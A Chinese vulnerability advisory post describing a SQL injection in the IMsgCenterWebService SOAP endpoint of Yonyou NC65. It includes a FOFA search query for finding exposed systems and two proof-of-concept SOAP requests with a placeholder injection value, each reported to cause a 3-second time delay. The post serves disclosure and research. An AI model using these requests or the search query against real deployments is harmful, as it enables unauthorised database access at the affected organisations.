#  用友 NC 系统 IMsgCenterWebService SQL注入漏洞  
 0day收割机   2026-05-20 05:18  
  
# 漏洞简介  
  
用友 NC（Yonyou NC）是一款广泛应用于大型企业的集成化管理软件，涵盖财务、供应链、人力资源等核心业务管理功能。NC 系统的 IMsgCenterWebService  
 接口在处理请求时存在 SQL 注入漏洞，主要原因是该接口未对外部输入的参数进行严格的过滤与验证。攻击者可通过构造恶意的 SQL 语句并发送至该接口，从而与后端数据库进行非法交互，不仅可能导致系统敏感信息泄露，严重时还可能造成数据库内容被篡改甚至完全控制数据库服务器，对企业信息安全构成重大威胁。建议受影响用户及时关注厂商发布的官方通告，并根据系统版本部署相应的修复补丁以加固防护。  
# 影响版本  
  
NC65  
# fofa语法  
> app="用友-UFIDA-NC"  
  
# 漏洞复现  
## doAction  
```
POST /uapws/service/nc.itf.msgcenter.IMsgCenterWebService HTTP/1.1
Host: 
SOAPAction: urn:doAction
Content-Type: text/xml;charset=UTF-8

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ims="http://msgcenter.itf.nc/IMsgCenterWebService">
   <soapenv:Header/>
   <soapenv:Body>
      <ims:doAction>
         <!--type: string-->
         <dataSource>NC65</dataSource>
         <!--type: string-->
         <actionCode>test</actionCode>
         <!--type: string-->
         <pluginType>test</pluginType>
         <!--type: string-->
         <param>{"user":"'SQLI_POC","pk_sourcemsg":""}</param>
      </ims:doAction>
   </soapenv:Body>
</soapenv:Envelope>
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZrTsB3aQgWDiaibCCtwE5VPZNLfJk9cwicUu2InF9KsEPuFw25iaM8YHpf7RLuEG3nb9Pyk65er0HPNs7K0b1tTJRK1Fgn8CtMzZz4Z2GHSdRDo/640?wx_fmt=png&from=appmsg "")  
  
成功延时 3 秒  
```
<?xml version="1.0" encoding="UTF-8"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" 
                  xmlns:ns="http://msgcenter.itf.nc/IMsgCenterWebService">
<soapenv:Header/>
<soapenv:Body>
<ns:queryMsgByUserAndType>
  <dataSource>NC65</dataSource>
<param>{"user":"SQLI_POC","msgtype":"test","msgstatus":"","start":"","end":"","seach":"","seachSender":"","billtype":"","billno":"","billid":""}</param>
  <pageSize>10</pageSize>
  <index>0</index>
</ns:queryMsgByUserAndType>
</soapenv:Body>
</soapenv:Envelope>
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZrTsB3aQgWCj4DMRIo3AibOzFJIZtgACoSzeT0zOj69GKj8CADqse9Xf5RicSrxQMMrMDboRdgX2v5Se2oVHU7c4w28VrZ8EG9Zdx8Giak0QEE/640?wx_fmt=png&from=appmsg "")  
  
成功延时 3 秒  
  
仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。  
  
